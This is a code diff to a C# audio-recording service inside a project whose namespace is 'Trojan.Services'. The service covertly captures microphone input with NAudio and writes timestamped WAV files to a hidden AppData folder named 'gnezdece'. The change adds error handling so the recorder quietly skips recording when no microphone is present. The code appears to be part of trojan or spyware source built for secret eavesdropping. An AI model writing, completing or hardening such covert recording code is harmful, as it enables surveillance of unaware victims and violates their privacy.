@@ -1,4 +1,5 @@
 ﻿using Microsoft.VisualBasic;
+using NAudio;
 using NAudio.Wave;
 using System;
 using System.IO;
@@ -12,42 +13,51 @@ namespace Trojan.Services
 
         public void Start()
         {
-            string folder = Path.Combine(
-                Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
-                "gnezdece",
-                "audio"
-            );
-
-            if (!Directory.Exists(folder))
-                Directory.CreateDirectory(folder);
-
-            string filePath = Path.Combine(
-                folder,
-                $"audio_{DateTime.Now:yyyyMMdd_HHmmss}.wav"
-            );
-
-            _waveSource = new WaveInEvent();
-
-            _waveSource.WaveFormat = new WaveFormat(44100, 1);
-
-            _waveSource.DataAvailable += (s, a) =>
+            try
             {
-                _waveFile?.Write(a.Buffer, 0, a.BytesRecorded);
-                _waveFile?.Flush();
-            };
+                string folder = Path.Combine(
+                    Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
+                    "gnezdece",
+                    "audio"
+                );
 
-            _waveSource.RecordingStopped += (s, a) =>
+                if (!Directory.Exists(folder))
+                    Directory.CreateDirectory(folder);
+
+                string filePath = Path.Combine(
+                    folder,
+                    $"audio_{DateTime.Now:yyyyMMdd_HHmmss}.wav"
+                );
+
+                _waveSource = new WaveInEvent();
+                _waveSource.WaveFormat = new WaveFormat(44100, 1);
+
+                _waveSource.DataAvailable += (s, a) =>
+                {
+                    _waveFile?.Write(a.Buffer, 0, a.BytesRecorded);
+                    _waveFile?.Flush();
+                };
+
+                _waveSource.RecordingStopped += (s, a) =>
+                {
+                    _waveFile?.Dispose();
+                    _waveFile = null;
+
+                    _waveSource?.Dispose();
+                    _waveSource = null;
+                };
+
+                _waveFile = new WaveFileWriter(filePath, _waveSource.WaveFormat);
+                _waveSource.StartRecording();
+            }
+            catch (MmException ex)
             {
+                Console.WriteLine($"Mikrofon ni na voljo. Preskakujem snemanje zvoka: {ex.Message}");
                 _waveFile?.Dispose();
                 _waveFile = null;
-
                 _waveSource?.Dispose();
                 _waveSource = null;
-            };
-
-            _waveFile = new WaveFileWriter(filePath, _waveSource.WaveFormat);
-
-            _waveSource.StartRecording();
+            }
         }
 
         public void Stop()
